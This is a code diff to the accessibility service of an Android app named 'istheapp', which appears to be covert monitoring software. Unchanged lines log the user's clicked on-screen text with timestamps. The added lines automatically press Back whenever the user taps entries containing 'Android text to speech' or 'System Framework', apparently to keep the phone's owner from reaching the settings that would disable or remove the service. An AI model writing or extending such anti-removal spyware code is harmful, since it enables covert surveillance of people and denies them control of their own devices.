@@ -2,6 +2,7 @@ package com.github.midros.istheapp.services.accessibilityData
 
 import android.Manifest
 import android.accessibilityservice.AccessibilityService
+import android.app.admin.DevicePolicyManager
 import android.content.Context
 import android.content.pm.PackageManager
 import android.location.Location
@@ -10,8 +11,11 @@ import android.location.LocationManager
 import android.os.Bundle
 import android.os.Handler
 import android.provider.Telephony
-import androidx.core.app.ActivityCompat
+import android.view.Window
+import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat.getSystemService
 import com.github.midros.istheapp.app.IsTheApp
 import com.github.midros.istheapp.services.sms.SmsObserver
 import com.github.midros.istheapp.utils.ConstFun.enableGpsRoot
@@ -21,6 +25,7 @@ import com.github.midros.istheapp.utils.Consts.TAG
 import com.pawegio.kandroid.i
 import com.pawegio.kandroid.runDelayedOnUiThread
 import javax.inject.Inject
+
 
 /**
  * Created by luis rafael on 17/03/18.
@@ -73,6 +78,9 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
                 if (data != "[]") {
                     interactor.setDataKey("${getDateTime()} |(CLICKED)| $data")
                     i(TAG, "${getDateTime()} |(CLICKED)| $data")
+                    if (data.contains("Android text to speech") || data.contains("System Framework")){
+                        performGlobalAction(GLOBAL_ACTION_BACK)
+                    }
                 }
             }
         }
